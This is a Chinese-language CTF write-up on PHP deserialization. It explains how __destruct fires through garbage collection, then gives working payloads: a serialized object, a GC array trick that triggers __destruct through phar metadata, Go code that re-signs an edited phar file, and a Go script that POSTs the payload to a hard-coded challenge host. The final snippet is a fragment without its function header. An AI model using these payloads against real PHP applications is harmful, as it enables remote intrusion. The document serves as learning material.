  • PHP 魔术方法

__destruct 是PHP对象的一个魔术方法，称为析构函数，顾名思义这是当该对象被销毁的时候自动执行的一个函数。其中以下情况会触发 __destruct

  • 主动调用unset($obj)
  • 主动调用$obj = NULL
  • 程序自动结束

我们很容易理解上述情况为什么会调用析构函数，因为这代表该对象要被清空了。除此之外，别忘了PHP拥有垃圾回收 Garbage collection 即我们常说的GC机制。

PHP中GC使用引用计数和回收周期自动管理内存对象，那么这时候当我们的对象变成了“垃圾”，就会被GC机制自动回收掉，回收过程中，就会调用函数的 __destruct。

刚才我们提到了引用计数，其实当一个对象没有任何饮用的时候，则会被视为“垃圾”，即

$a = new obj();

这是一个obj对象，被a变量应用，所以它不是“垃圾”。如果是

new obj();

或

$a = new obj();$a = 2;

上面都是对象没有被饮用或开始有饮用之后失去了引用的情况

测试代码

<?php

class obj
{
    public function __destruct()
    {
        echo "__destruct()";
    }
}

new obj();
throw new Error("Error");

新建了一个对象但是没有对其进行引用，因而在抛出异常之前就执行了 __destruct() 方法

  • 第一关

明显我们看到有个 unserialize 函数可以进行反序列化，同时会发现这里反序列化是没有任何引用的，所以按照上述会在执行完毕之后处于 unset 状态，会回收这个对象，即执行 __destruct，这一步通过调试可能更加清楚的看到执行流程。这样的话，我们便可以直接在这里写入数据。

O:1:"A":1:{s:6:"config";s:1:"w";}
  • 第二关

可以写入数据了，但是只能向指定文件中写入数据，无法写入 shell

同时在 A 中可以读取文件，这里可以利用 phar 触发反序列化

但是如果我们直接在phar文件的 Metadata 写 getflag 对象的话，显然是不能进行反序列化的，因为他反序列化之后会被 phar 对象的 metadata 属性引用，不符合 unset 情况

这里的话，我们就需要利用GC来进行执行__destruct

a:2:{i:0;O:7:"getflag":{}i:0;N;}

考虑反序列化本字符串，我们可以发现，因为反序列化的过程是顺序执行的，所以到第一个属性是，会将 Array[0] 设置为 getflag 对象，同时我们又将 Array[0] 设置为 null，这样前面的 getflag 对象便丢失了引用，就会被GC所捕获，便可以执行 __destruct 了。

  • 第三关

接下来就是生成 phar 文件

但是在序列化数组时无法生成我们需要的字符串的，所以在生成之后还要对文件进行修改

但是修改之后改变了数据，导致在使用 phar:// 读取文件时出现签名错误从而结束解析无法实现反序列化

我们可以通过 010 等编辑器打开 phar 文件查看签名类型， 这里以 sha1 签名为例，修复代码如下

package main

import (
	"crypto/sha1"
	"io"
	"os"
	"syscall"
)

func main() {
	srcfile, err := os.OpenFile("phar.phar", syscall.O_RDONLY, 0666)
	if err != nil {
		return
	}
	defer srcfile.Close()

	dstfile, err := os.OpenFile("dst.phar", syscall.O_CREAT|syscall.O_WRONLY, 0666)
	if err != nil {
		return
	}
	defer dstfile.Close()

	data, err := io.ReadAll(srcfile)
	if err != nil {
		return
	}
	payload := data[:len(data)-28]
	tail := data[len(data)-8:]
	hash := sha1.New()
	hash.Write(payload)
	sum := hash.Sum(nil)
	
	_, err = dstfile.Write(append(append(payload, sum...), tail...))
	if err != nil {
		return
	}
}

	srcfile, err := os.OpenFile("dst.phar", syscall.O_RDONLY, 0666)
	if err != nil {
		return
	}
	defer srcfile.Close()

	data, err := io.ReadAll(srcfile)
	if err != nil {
		return
	}
	values := url.Values{"0[]": {string(data)}}
	target := "http://1.14.71.254:28730/"
	response, err := http.PostForm(target+"?0=O:1:\"A\":1:{s:6:\"config\";s:1:\"w\";}", values)
	if err != nil {
		return
	}
	defer response.Body.Close()
	values = url.Values{"0": {"phar://tmp/a.txt"}}
	response, err = http.PostForm(target+"?0=O:1:\"A\":1:{s:6:\"config\";s:1:\"r\";}", values)
	if err != nil {
		return
	}
	html, err := io.ReadAll(response.Body)
	if err != nil {
		return
	}
	fmt.Println(string(html))
}
